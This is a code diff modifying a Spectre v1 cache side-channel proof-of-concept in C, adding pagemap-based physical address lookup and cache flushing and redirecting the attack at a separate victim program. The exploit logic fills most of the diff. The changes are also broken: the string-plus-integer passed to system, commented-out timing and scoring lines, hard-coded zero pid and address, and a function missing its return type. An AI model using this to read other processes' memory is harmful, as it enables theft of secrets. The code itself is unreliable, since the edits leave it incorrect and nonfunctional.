@@ -10,6 +10,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <fcntl.h> /* open */
+#include <stdint.h> /* uint64_t  */
+#include <stdio.h> /* printf */
+#include <stdlib.h> /* size_t */
+#include <unistd.h> /* pread, sysconf */
 
 #ifdef _MSC_VER
 #include <intrin.h>        /* for rdtscp and clflush */
@@ -22,6 +27,84 @@
 Analysis code
 ********************************************************************/
 #define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */
+typedef struct {
+	uint64_t pfn : 54;
+	unsigned int soft_dirty : 1;
+	unsigned int file_page : 1;
+	unsigned int swapped : 1;
+	unsigned int present : 1;
+} PagemapEntry;
+
+/* Parse the pagemap entry for the given virtual address.
+ *
+ * @param[out] entry      the parsed entry
+ * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
+ * @param[in]  vaddr      virtual address to get entry for
+ * @return 0 for success, 1 for failure
+ */
+int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr) {
+	size_t nread;
+	ssize_t ret;
+	uint64_t data;
+	uintptr_t vpn;
+	vpn = vaddr / sysconf(_SC_PAGE_SIZE);
+	nread = 0;
+	while (nread < sizeof(data)) {
+		ret = pread(pagemap_fd, &data, sizeof(data) - nread,
+		            vpn * sizeof(data) + nread);
+		nread += ret;
+		if (ret <= 0) {
+			return 1;
+		}
+	}
+	entry->pfn = data & (((uint64_t) 1 << 54) - 1);
+	entry->soft_dirty = (data >> 54) & 1;
+	entry->file_page = (data >> 61) & 1;
+	entry->swapped = (data >> 62) & 1;
+	entry->present = (data >> 63) & 1;
+	return 0;
+}
+
+/* Convert the given virtual address to physical using /proc/PID/pagemap.
+ *
+ * @param[out] paddr physical address
+ * @param[in]  pid   process to convert for
+ * @param[in] vaddr virtual address to get entry for
+ * @return 0 for success, 1 for failure
+ */
+int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr) {
+	char pagemap_file[BUFSIZ];
+	int pagemap_fd;
+	snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t) pid);
+	pagemap_fd = open(pagemap_file, O_RDONLY);
+	if (pagemap_fd < 0) {
+		return 1;
+	}
+	PagemapEntry entry;
+	if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
+		return 1;
+	}
+	close(pagemap_fd);
+	*paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
+	return 0;
+}
+
+mem_flush(const void *p, unsigned int allocation_size) {
+	const size_t cache_line = 64;
+	const char *cp = (const char *) p;
+	size_t i = 0;
+	for (i = 0; i < allocation_size; i += cache_line) {
+		asm volatile("clflush (%0)\n\t"
+		:
+		: "r"(&cp[i])
+		: "memory");
+	}
+
+	asm volatile("sfence\n\t"
+	:
+	:
+	: "memory");
+}
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -33,15 +116,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 	for (tries = 999; tries > 0; tries--) {
-
+		mem_flush((void *) malicious_x, 30);
 		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
+		//for (i = 0; i < 256; i++)
+		//_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
+		training_x = tries % 16;
 		for (j = 29; j >= 0; j--) {
-			_mm_clflush(&array1_size);
+			//_mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -51,18 +134,18 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			x = training_x ^ (x & (malicious_x ^ training_x));
 
 			/* Call the victim! */
-			victim_function(x);
+			system("./victim.out " + x);
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 256; i++) {
 			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
+			//addr = &array2[mix_i * 512];
 			time1 = __rdtscp(&junk);            /* READ TIMER */
 			junk = *addr;                       /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++;  /* cache hit - add +1 to score for this value */
+			//if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % 16])
+			//results[mix_i]++;  /* cache hit - add +1 to score for this value */
 		}
 
 		/* Locate highest & second-highest results results tallies in j/k */
@@ -86,16 +169,18 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 }
 
 int main(int argc, const char **argv) {
-	size_t malicious_x = (size_t) (secret - (char *) array1);   /* default for malicious_x */
-	int i, score[2], len = 40;
-	uint8_t value[2];
-	for (i = 0; i < sizeof(array2); i++)
-		array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
-	if (argc == 3) {
-		sscanf(argv[1], "%p", (void **) (&malicious_x));
-		malicious_x -= (size_t) array1;  /* Convert input value into a pointer */
-		sscanf(argv[2], "%d", &len);
+	pid_t pid;
+	uintptr_t vaddr, paddr = 0;
+	pid = 000;
+	vaddr = 000;
+	if (virt_to_phys_user(&paddr, pid, vaddr)) {
+		fprintf(stderr, "error: virt_to_phys_user\n");
+		return EXIT_FAILURE;
 	}
+	//
+	size_t malicious_x = (size_t) ((char *) -paddr);
+	int score[2], len = 40;
+	uint8_t value[2];
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0) {
 		printf("Reading at malicious_x = %p... ", (void *) malicious_x);
